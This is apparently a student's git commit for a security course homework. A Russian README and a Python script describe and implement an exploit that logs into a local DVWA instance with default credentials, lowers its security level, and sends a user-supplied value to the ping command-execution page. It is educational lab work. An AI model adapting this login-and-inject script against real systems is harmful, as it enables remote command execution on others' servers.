9e28ee2ddf6716c4a8da3512d19e649f63d12438
Denis Stasyev <denisstasyev@gmail.com>
2019-10-17 18:09:42 +0300

    Do Homework 1

---
+++ homework1/README.md
@@ -0,0 +1,20 @@
+# Homework 1
+
+## Task
+Написать эксплойт (скрипт), который бы мог залогиниться в DVWA и выполнить команду, используя RCE уязвимость (ping).
+
+## Execution of ping in DVWA
+- Скрипт логинится в DVWA
+- Выполняет ping на адрес, указанный пользователем при запуске
+
+## Environment
+Чтобы запустить скрипт необходимо наличие DVWA, например, через Docker:
+
+1. docker pull citizenstig/dvwa
+2. docker run -d -p 8080:80 citizenstig/dvwa
+
+3. docker container ls
+4. docker stop <CONTAINER ID>
+
+5. docker images
+6. docker image rm -f <IMAGE ID> 
---
+++ homework1/script.py
@@ -0,0 +1,45 @@
+import sys
+import requests
+from bs4 import BeautifulSoup
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Please write url!")
+        sys.exit(0)
+
+    url = 'http://localhost:8080/'
+
+    # Auth
+    session = requests.Session()
+    resp = session.get(url + 'login.php')
+    soup = BeautifulSoup(resp.content, features="html.parser")
+    result = soup.find('input', {'name': 'user_token'})
+    token = result['value']
+
+    data = {
+        'username': 'admin',
+        'password': 'password',
+        'Login': 'Login',
+        'user_token': token,
+    }
+    session.post(url + 'login.php', data=data)
+
+    # Change security
+    data = {
+        'security': 'low',
+        'seclev_submit': 'Submit',
+        'user_token': token,
+    }
+    session.post(url + 'security.php', data=data)
+
+    # Send ping
+    data = {
+        'ip': sys.argv[1],
+        'Submit': 'Submit',
+        'user_token': token,
+    }
+    resp = session.post(url + 'vulnerabilities/exec/', data=data)
+    soup = BeautifulSoup(resp.content, features="html.parser")
+    result = soup.find('pre')
+    print(result.text)
+
